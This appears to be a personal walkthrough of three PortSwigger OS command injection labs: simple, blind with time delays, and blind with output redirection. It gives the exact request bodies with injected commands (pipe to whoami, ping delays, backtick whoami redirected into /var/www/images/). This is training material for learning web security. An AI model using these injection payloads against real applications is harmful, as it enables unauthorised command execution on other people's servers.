# 1. Lab: [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)

The application executes a shell command containing user-supplied product and store IDs, _and returns the raw output from the command in its response._

To solve the lab, execute the _whoami_ command to determine the name of the current user.

```bash
productId=3&storeId=|whoami
```

# 2. Lab: [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

This lab contains a **blind** OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the **blind OS command injection** vulnerability _to cause a 10 second delay_.

for delay:

```bash
%26ping+-c+10+8.8.8.8%26
```

_csrf=_

```bash
csrf=NxepZ59AXw9X4UNfM9ngvV4EmVVHOknr&name=%26ping+-c+10+8.8.8.8%26&email=%26ping+-c+15+8.8.8.8%26&subject=hi&message=%26ping+-c+10+8.8.8.8%26
```

# 3. Lab: [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

This lab contains a blind OS command injection vulnerability in the _feedback function_.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use **output redirection** to capture the output from the command. There is a writable folder at:
**/var/www/images/**
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.

in url: => GET /image?filename=7.jpg HTTP/2
save: => GET /image?filename=whoami.txt HTTP/2
create: whoami.txt
go to submit (feedback function)
find: POST /feedback/submit HTTP/2
in body

```javascript
csrf=8NQZN673b5Nb1qtVf5P4kFyAnz8Rw180&name=testname&email=2%4022&subject=hi&message=dddd
```

change to:

```js
csrf=8NQZN673b5Nb1qtVf5P4kFyAnz8Rw180&name=testname&email=2%4022&subject=hi&message=%26+`sleep+10`+%26
```

```js
payload:
%26+`sleep+10`+%26
```

send:

```js
csrf=8NQZN673b5Nb1qtVf5P4kFyAnz8Rw180&name=testname&email=2%4022&subject=hi&message=%26+`whoami+>+whoami.txt`+%26
```

```js
payload: `whoami+>+whoami.txt`
```

add before: whoami.txt => /var/www/images/ to payload
send:

```js
csrf=8NQZN673b5Nb1qtVf5P4kFyAnz8Rw180&name=testname&email=2%4022&subject=hi&message=%26+`whoami+>+/var/www/images/whoami.txt`+%26
```

go to url: => whoami.txt
send: GET /image?filename=whoami.txt HTTP/2
response: peter-4eggPb
